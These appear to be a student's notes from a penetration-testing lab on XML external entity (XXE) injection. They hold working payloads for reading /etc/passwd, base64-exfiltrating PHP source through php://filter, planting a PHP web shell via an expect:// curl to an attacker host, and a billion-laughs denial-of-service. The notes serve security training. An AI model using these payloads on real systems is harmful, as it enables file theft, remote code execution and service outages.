## Identifying
![](Pasted%20image%2020260723140101.png)
![](Pasted%20image%2020260723140112.png)
![](Pasted%20image%2020260723140118.png)

```xml
<!DOCTYPE email [ 
	<!ENTITY company "Inlane Freight"> 
]>
```

Now, we should have a new XML entity called `company`, which we can reference with `&company;`. So, instead of using our email in the `email` element, let us try using `&company;`, and see whether it will be replaced with the value we defined (`Inlane Freight`):
![](Pasted%20image%2020260723140235.png)
## Reading Sensitive Files

```xml
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "file:///etc/passwd"> 
]>
```
![](Pasted%20image%2020260723140343.png)
## Reading Source Code
![](Pasted%20image%2020260723140444.png)

```xml
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"> 
]>
```

With that, we can send our request, and we will get the base64 encoded string of the `index.php` file:
![](Pasted%20image%2020260723140547.png)
## Remote Code Execution with XXE

```shell
3kjS@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php 
3kjS@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:
```xml
<?xml version="1.0"?> 
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'"> 
]> 
<root> 
<name></name> 
<tel></tel> 
<email>&company;</email> 
<message></message> 
</root>
```

**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.
## Other XXE Attacks

```xml
<?xml version="1.0"?> 
<!DOCTYPE email [ 
	<!ENTITY a0 "DOS" > 
	<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;"> 
	<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;"> 
	<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;"> 
	<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;"> 
	<!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;"> 
	<!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;"> 
	<!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;"> 
	<!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;"> 
	<!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;"> 
	<!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;"> 
]> 
<root> 
<name></name> 
<tel></tel> 
<email>&a10;</email> 
<message></message> 
</root>
```
